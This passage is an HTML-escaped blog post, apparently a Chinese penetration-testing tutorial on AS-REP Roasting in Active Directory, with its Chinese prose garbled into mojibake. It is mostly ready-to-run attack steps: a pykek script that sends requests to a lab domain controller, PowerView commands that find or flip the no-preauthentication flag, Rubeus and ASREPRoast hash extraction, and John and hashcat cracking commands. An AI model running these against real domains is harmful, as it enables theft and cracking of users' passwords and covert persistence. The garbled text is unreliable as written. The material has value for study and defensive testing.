&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæœ‰æ²¡æœ‰åŒå­¦æ€è€ƒè¿‡ï¼Œå¦‚æœå…³é—­ç”¨æˆ·é€‰é¡¹â€Do not require Kerberos preauthenticationâ€ï¼Œæˆ‘å°è¯•ä½¿ç”¨æ­£å¸¸çš„å¯†ç ç™»å½•ç³»ç»Ÿå†æŠ“åŒ…ï¼Œå…¶ä¸­çš„AS_REPåŒ…ä¸­çš„ciperå€¼æ˜¯å¦ä¹Ÿèƒ½ç”¨hashcatè§£å¯†å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;è™½ç„¶æ„Ÿè§‰æ˜¯åœ¨è„±è£¤å­æ”¾å±ï¼Œä½†æ˜¯ä½ å¯ä»¥å®è·µæŠ“åŒ…çœ‹ä¸‹ï¼Œå¦‚æœç»†å¿ƒçš„åŒå­¦å°±ä¼šå‘ç°ï¼Œå…¶å®åªè¦æŒ‡å®šåŠ å¯†çš„ç±»å‹ä¸ºRC4_HMACï¼Œä¸€æ ·æ˜¯å¯ä»¥ç”¨hashcatè§£å¯†çš„ã€‚&lt;/p&gt;
&lt;p&gt;å¹³æ—¶æˆ‘ä»¬ç™»å½•çš„æ€ä¹ˆæŒ‡å®šåŠ å¯†ç±»å‹å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonå†™çš„ä¸€ä¸ªé¡¹ç›®ï¼šhttps://github.com/mubix/pykek&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ä¸‹é¢çš„ä»£ç æ¨¡æ‹Ÿå‘åŒ…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RC4_HMAC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;ntlm_hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;p@ssw0rd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#è¿™é‡Œå¡«å†™å¯†ç &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;as_req&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;build_as_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;hack.lab&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;lucky&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getrandbits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pac_request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;send_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;as_req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;172.16.0.106&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#å¯ä»¥å¡«å†™ä¸ºdcä¸»æœºåï¼Œæ¯”å¦‚dc.hack.lab&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;recv_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;as_rep&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decrypt_as_rep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_rep&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç ´è§£çš„æ–¹æ³•å¯ä»¥å‚è€ƒhashcaté‡Œé¢çš„ï¼Œæˆ‘ä¹Ÿæ²¡å¼„æ‡‚ï¼Œæ‰¾æ—¶é—´çœ‹ä¸€ä¸‹æ˜¯æ€ä¹ˆç ´è§£çš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/hashcat/hashcat/blob/master/src/modules/module_18200.c&#34;&gt;https://github.com/hashcat/hashcat/blob/master/src/modules/module_18200.c&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;åˆ©ç”¨æ€è·¯&#34;&gt;åˆ©ç”¨æ€è·¯&lt;/h2&gt;
&lt;p&gt;é‚£ä¹ˆåœ¨å®æˆ˜å½“ä¸­å¾ˆå°‘è§ä¼šå¼€å¯è¿™ä¸ªé€‰é¡¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å†…ç½‘æ¸—é€ä¸­ä¸€èˆ¬æ˜¯ç”¨æ¥åšæƒé™ç»´æŒã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;éœ€è¦æšä¸¾åŸŸå†…ç”¨æˆ·æ˜¯å¦å­˜åœ¨å¼€å¯é€‰é¡¹&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¯ä»¥ä½¿ç”¨PowerViewã€kerbruteç­‰å·¥å…·æšä¸¾å‡ºå­˜åœ¨å¼€å¯é€‰é¡¹â€Do not require Kerberos preauthenticationâ€çš„ç”¨æˆ·&lt;/li&gt;
&lt;li&gt;å¯¼å‡ºhashå¹¶ç ´è§£&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;éœ€è¦å…ˆè·å¾—å¯¹æŒ‡å®šç”¨æˆ·çš„GenericWriteæƒé™ï¼Œåˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¼€å¯ç”¨æˆ·é€‰é¡¹â€Do not require Kerberos preauthenticationâ€&lt;/li&gt;
&lt;li&gt;å¯¼å‡ºhashå¹¶ç ´è§£&lt;/li&gt;
&lt;li&gt;å…³é—­ç”¨æˆ·é€‰é¡¹â€Do not require Kerberos preauthenticationâ€&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ä¸kerberoastingå’Œé»„é‡‘ç¥¨æ®çš„åŒºåˆ«&#34;&gt;ä¸Kerberoastingå’Œé»„é‡‘ç¥¨æ®çš„åŒºåˆ«&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Â·&lt;/strong&gt; AS-REP Roastingï¼šè·å–ç”¨æˆ·hashç„¶åç¦»çº¿æš´åŠ›ç ´è§£&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Â·&lt;/strong&gt; Kerberoastingï¼šè·å–åº”ç”¨æœåŠ¡hashç„¶åæš´åŠ›ç ´è§£&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Â·&lt;/strong&gt; é»„é‡‘ç¥¨æ®ï¼šé€šè¿‡å‡å†’åŸŸä¸­ä¸å­˜åœ¨çš„ç”¨æˆ·æ¥è®¿é—®åº”ç”¨æœåŠ¡&lt;/p&gt;
&lt;h1 id=&#34;0x02-å®æˆ˜&#34;&gt;0x02 å®æˆ˜&lt;/h1&gt;
&lt;p&gt;ä¸‹é¢æ˜¯ä½¿ç”¨å„ç§å·¥å…·è¿›è¡Œæ”»å‡»çš„å…·ä½“è¿‡ç¨‹&lt;/p&gt;
&lt;h2 id=&#34;powerview&#34;&gt;PowerView&lt;/h2&gt;
&lt;p&gt;è¿™æ¬¾å·¥å…·æ˜¯é›†æˆåœ¨&lt;code&gt;PowerSploit&lt;/code&gt;é‡Œé¢çš„ï¼Œå±äº&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon&#34;&gt;Recon&lt;/a&gt;ç³»åˆ—ï¼Œè¿™æ¬¾å·¥å…·æ˜¯ç”±HarmJ0yå¤§ç‰›å¼€å‘çš„ã€‚&lt;/p&gt;
&lt;p&gt;GitHubï¼šhttps://github.com/PowerShellMafia/PowerSploit&lt;/p&gt;
&lt;p&gt;åŸç†æ˜¯ä½¿ç”¨LDAPæŸ¥è¯¢æ»¡è¶³æ¡ä»¶(userAccountControl:1.2.840.113556.1.4.803:=4194304)çš„ç”¨æˆ·ï¼ŒDONT_REQ_PREAUTHé¡¹å¯¹åº”çš„å€¼ä¸º4194304ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹çš„æ–‡æ¡£&lt;a href=&#34;https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties&#34;&gt;Use the UserAccountControl flags to manipulate user account properties&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å‡å¦‚æˆ‘ç°åœ¨ç¯å¢ƒæ˜¯åœ¨æ‹¿åˆ°äº†æ™®é€šåŸŸç”¨æˆ·testsqlä¸‹æ‰§è¡ŒPowerViewè„šæœ¬&lt;/p&gt;
&lt;p&gt;PowerViewçš„å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Import-Module .\PowerView.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Get-DomainUser -PreauthNotRequired -Verbose
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¤ºä¾‹å¦‚ä¸‹å›¾:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœè¦æœ‰å¼€å¯ç”¨æˆ·çš„&lt;code&gt;Do not require Kerberos preauthentication&lt;/code&gt;é€‰é¡¹éœ€è¦æ‹¥æœ‰GenericWriteæƒé™ï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢æ‰€è¯´çš„ç¬¬äºŒç§åˆ©ç”¨æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;å¼€å¯é€‰é¡¹æ„å‘³ç€å¯¹ç”¨æˆ·æ·»åŠ å±æ€§(userAccountControl=4194304)&lt;/p&gt;
&lt;p&gt;å¼€å¯é€‰é¡¹çš„å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Import-Module .\PowerView.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…³é—­é€‰é¡¹æ„å‘³ç€åˆ é™¤ç”¨æˆ·å±æ€§(userAccountControl=4194304)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œå¯ä»¥å†æ¬¡è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œä¸¤æ¬¡å¼‚æˆ–ç›¸å½“äºä¸æ”¹å˜åŸæ•°å€¼ï¼Œå³åˆ é™¤ç”¨æˆ·å±æ€§(userAccountControl)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å…³é—­é€‰é¡¹çš„å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Import-Module .\PowerView.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;kerbrutepython&#34;&gt;kerbruteï¼ˆPythonï¼‰&lt;/h2&gt;
&lt;p&gt;è¿™æ¬¾å·¥å…·ä¸»è¦æ˜¯æ¥æšä¸¾åŸŸå†…å­˜åœ¨å¼€å¯&lt;code&gt;Do not require Kerberos preauthentication&lt;/code&gt;é€‰é¡¹çš„ç”¨æˆ·ï¼Œåœ¨ä¹‹å‰å†™çš„åŸŸç”¨æˆ·æšä¸¾çš„ä¸€ç¯‡æ–‡ç« ä¸­å†™å¤šï¼Œè¿™é‡Œå°±ä¸å†å±•å¼€ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥çœ‹ä¸‹&lt;a href=&#34;https://xxe.icu/posts/kerberos_user_enumerate/#kerbrutepython&#34;&gt;åŸŸæ¸—é€-ç”¨æˆ·åæšä¸¾&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;rubeus&#34;&gt;Rubeus&lt;/h2&gt;
&lt;p&gt;è¿™æ¬¾å·¥å…·ä¹Ÿæ˜¯ç”±HarmJ0yå¤§ç‰›å¼€å‘çš„ï¼Œæ˜¯ä¸€ä¸ªç”¨äºåŸå§‹Kerberosäº’åŠ¨å’Œæ»¥ç”¨çš„Cï¼ƒå·¥å…·é›†ï¼ŒåŠŸèƒ½è¿˜å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€ä»‹ç»ï¼Œä¸»è¦æ˜¯åˆ©ç”¨é‡Œé¢çš„AS-REP-Roastingçš„åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨GitHubä¸Šé¢ä¸å¼€æ”¾exeç‰ˆæœ¬ä¸‹è½½äº†ï¼Œéœ€è¦è‡ªå·±å»ç”Ÿæˆï¼Œæˆ‘ä»¬å…ˆå»GitHubä¸‹é¢ä¸‹è½½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;https://github.com/GhostPack/Rubeus&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è§£å‹åä½¿ç”¨vs2019æ‰“å¼€Rubeus.slnæ–‡ä»¶ï¼Œç‚¹å‡»ç”Ÿæˆ-&amp;gt;ç”ŸæˆRubeuså³å¯ï¼Œä¹‹åexeæ–‡ä»¶ä¼šç”Ÿæˆåœ¨&lt;code&gt;Rubeus\bin\Debug&lt;/code&gt;ç›®å½•ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;å‡å¦‚æˆ‘ç°åœ¨ç¯å¢ƒæ˜¯åœ¨æ‹¿åˆ°äº†æ™®é€šåŸŸç”¨æˆ·testsqlä¸‹æ‰§è¡ŒPowerViewè„šæœ¬,ç›´æ¥è¾“å…¥å‘½ä»¤å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rubeus.exe asreproast
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;èƒ½æšä¸¾å‡ºåŸŸå†…å­˜åœ¨è¯¥æ¼æ´çš„ç”¨æˆ·çš„hashï¼Œé»˜è®¤è¾“å‡ºçš„æ ¼å¼æ˜¯John the Ripper (&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;Jumbo version&lt;/a&gt;)ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç ´è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;John ./hash.txt â€“wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;./password.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹Ÿå¯ä»¥è¾“å‡ºä¸ºhashcatçš„æ ¼å¼ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asreproast&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hashcat&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outfile&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Temp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é‡‡ç”¨hashcatç ´è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;18200&lt;/span&gt; -a &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; hash.txt passwordlist.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœæˆ‘ä»¬ä¸åœ¨åŸŸç”¨æˆ·ä¸‹å‘¢ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬æ‹¿åˆ°äº†æœ¬åœ°è´¦æˆ·çš„æœºå™¨è·ŸDC(172.16.0.106)æ˜¯ç›¸é€šçš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæšä¸¾ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Rubeus&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asreproast&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;domain&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;lab&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lucky&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hashcat&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outfile&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Temp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;asreproast&#34;&gt;ASREPRoast&lt;/h2&gt;
&lt;p&gt;è¿™æ¬¾å·¥å…·ä¹Ÿæ˜¯ç”±HarmJ0yå¤§ç‰›å¼€å‘çš„ï¼Œä¸è¿‡æ¨èä½¿ç”¨&lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;Rubeus&lt;/a&gt; ï¼Œå› ä¸ºä¸Šé¢çš„åŠŸèƒ½å¾ˆé½å…¨ï¼Œä¸‹é¢æ˜¯åˆ©ç”¨çš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨GitHubä¸Šè¿›è¡Œä¸‹è½½ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/HarmJ0y/ASREPRoast&#34;&gt;https://github.com/HarmJ0y/ASREPRoast&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å‡å¦‚æˆ‘ç°åœ¨ç¯å¢ƒæ˜¯åœ¨æ‹¿åˆ°äº†æ™®é€šåŸŸç”¨æˆ·testsqlä¸‹æ‰§è¡Œè¯¥è„šæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ASREPRoast&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-ASREPRoast&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœæƒ³è¦å¯¼å‡ºhashå€¼è¿›è¡Œç ´è§£å¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-ASREPRoast&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;select &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-ExpandProperty&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Hash&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;powershell-empire&#34;&gt;Powershell Empire&lt;/h2&gt;
